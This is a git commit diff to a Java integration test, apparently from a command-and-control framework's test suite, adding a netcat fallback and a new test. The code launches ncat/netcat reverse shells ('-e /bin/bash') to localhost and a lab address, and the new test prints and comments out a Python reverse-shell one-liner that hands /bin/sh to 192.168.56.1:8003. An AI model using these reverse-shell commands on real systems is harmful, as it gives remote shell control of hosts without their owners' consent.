91f48f6b3f6fc16a3a811b3283fbc2b7540c5dce
matt-handy <matt.e.handy@gmail.com>
2023-10-10 14:39:31 -0400

    Update ncat test

--- test/c2/nativeshell/NcatIntegrationTest.java
+++ test/c2/nativeshell/NcatIntegrationTest.java
@@ -5,6 +5,7 @@ import java.io.IOException;
 import org.junit.jupiter.api.Test;
 
 import c2.remote.RemoteTestExecutor;
+import util.Time;
 import util.test.ClientServerTest;
 import util.test.RunnerTestGeneric;
 import util.test.TestConfiguration;
@@ -17,18 +18,27 @@ class NcatIntegrationTest extends ClientServerTest {
 	void test() {
 		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();
 
+		String ncatName = "ncat";
+		
 		try {
-			Runtime.getRuntime().exec("ncat");
+			Runtime.getRuntime().exec(ncatName);
 		} catch (IOException e) {
-			System.out.println("ncat not available on this host, skipping ncat integration test sequence");
-			return;
+			System.out.println("ncat not available on this host, attempting netcat");
+			try {
+				Runtime.getRuntime().exec("netcat");
+				ncatName = "netcat";
+			} catch (IOException ex) {
+				System.out.println("netcat not available on this host, skipping this test");
+				return;
+			}
 		}
+		
 		if (thisOS == OS.WINDOWS) {
 			initiateServer();
 			spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);
 		} else {
 			initiateServer("test_linux.properties");
-			spawnClient("ncat localhost 8003 -e /bin/bash");
+			spawnClient(ncatName + " localhost 8003 -e /bin/bash");
 		}
 		RunnerTestGeneric.test(new TestConfiguration(thisOS, "Native", "TCP"));
 		awaitClient();
@@ -38,12 +48,11 @@ class NcatIntegrationTest extends ClientServerTest {
 	
 	@Test
 	void testCrossPlatform() {
-		//TODO Implement me!!!
 		/*
 		initiateServer();
 		
 		RemoteTestExecutor exec = new RemoteTestExecutor();
-		exec.startTestProgram(1005, "ncat 192.168.56.1 8003 -e /bin/bash");
+		exec.startTestProgram(1005, "netcat 192.168.56.1 8003 -e /bin/bash");
 		
 		System.out.println("Transmitting commands");
 		
@@ -52,5 +61,26 @@ class NcatIntegrationTest extends ClientServerTest {
 		teardown();
 		*/
 	}
+	
+	@Test
+	void testLinuxPythonOneLiner() {
+		/*
+		initiateServer();
+		//TODO: Augment the remote test executor to handle this correctly. 
+		//RemoteTestExecutor exec = new RemoteTestExecutor();
+		//exec.startTestProgram(1005, "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
+		System.out.println(
+				"Please start Linux python oneliner session now, such as: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
+		Time.sleepWrapped(3000);
+
+		System.out.println("Transmitting commands");
+
+		TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
+		RunnerTestGeneric.test(config);
+		teardown();
+		*/
+	}
+	
+	
 
 }
